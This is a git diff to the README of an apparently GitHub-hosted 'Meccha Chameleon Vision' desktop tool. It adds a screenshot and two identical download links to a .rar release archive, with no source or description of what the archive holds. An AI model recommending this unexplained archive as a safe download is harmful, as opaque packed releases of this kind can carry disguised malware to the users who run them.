@@ -3,6 +3,7 @@ MECCHA-CHAMELEON-VISION
 # 🎨 Meccha Chameleon Vision — Desktop Tool 2026
 
 ---
+<img width="1289" height="719" alt="image" src="https://github.com/user-attachments/assets/261fa627-28f0-40c3-a728-9799e000e697" />
 
 ## 📌 About Meccha Chameleon Vision
 
@@ -12,7 +13,7 @@ Designed for testing and educational purposes, this tool allows users to explore
 
 ---
 
-## 📥 [Download]
+## 📥 [Download](https://github.com/StewardFence/MECCHA-CHAMELEON-VISION/releases/download/MECCHA-CHAMELEON-VISION/Meccha.Chameleon.Enhanced.v2.1.rar)
 
 
 
@@ -49,6 +50,7 @@ This project is licensed under **GPL-3.0-or-later**.
 
 **Official project repository:**
 
+## 📥 [Download](https://github.com/StewardFence/MECCHA-CHAMELEON-VISION/releases/download/MECCHA-CHAMELEON-VISION/Meccha.Chameleon.Enhanced.v2.1.rar)
 
 
 Modified builds must preserve the license notice and must not imply they are official releases. See BRANDING.md.
